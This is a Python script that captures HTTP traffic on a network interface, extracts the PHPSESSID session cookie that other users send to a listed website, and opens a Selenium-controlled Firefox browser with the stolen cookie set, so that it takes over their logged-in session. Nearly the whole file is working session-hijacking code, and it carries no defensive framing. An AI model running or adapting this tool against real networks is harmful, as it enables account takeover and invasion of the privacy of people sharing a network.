import pyshark
import time
from selenium import webdriver
from argparse import ArgumentParser

# custom user agent to differ selenium webdriver browser from regular browser
USER_AGENT = "selenium"

# website : cookie name
searched_webpages = {
    "mpietrek.pl": "PHPSESSID"
}

def parse_cookies(cookies):
    return [
        {"name": cookie.split('=')[0], "value": cookie.split("=")[1]}
        for cookie in cookies.split('; ')
    ]

def sniff(interface):
    session = pyshark.LiveCapture(
        interface=interface, display_filter="http.cookie"
    )

    for packet in session.sniff_continuously():
        # if request was sent from webdriver agent, just ignore it
        if (packet.http.user_agent == USER_AGENT):
            continue

        print(packet.http.host)
        host = packet.http.host
        if (host in searched_webpages):
            try:
                cookie = next(cookie for cookie in parse_cookies(packet.http.cookie) if cookie["name"] == searched_webpages[packet.http.host])
            except StopIteration:
                pass
            if (cookie):
                # set custom user-agent
                profile = webdriver.FirefoxProfile()
                profile.set_preference("general.useragent.override", USER_AGENT)

                # launch the browser
                browser = webdriver.Firefox(profile)
                browser.get('http://' + host + packet.http.request_uri)
                browser.add_cookie(cookie)
                browser.refresh()
                print("A cookie for " + host + " was loaded")

def parse_args():
    parser = ArgumentParser()
    parser.add_argument(
        "--interface",
        "-i",
        type=str,
        required=True,
        help="Network interface identifier, tshark -D"
    )

    return parser.parse_args()

if __name__ == "__main__":
    arg = parse_args()
    sniff(arg.interface)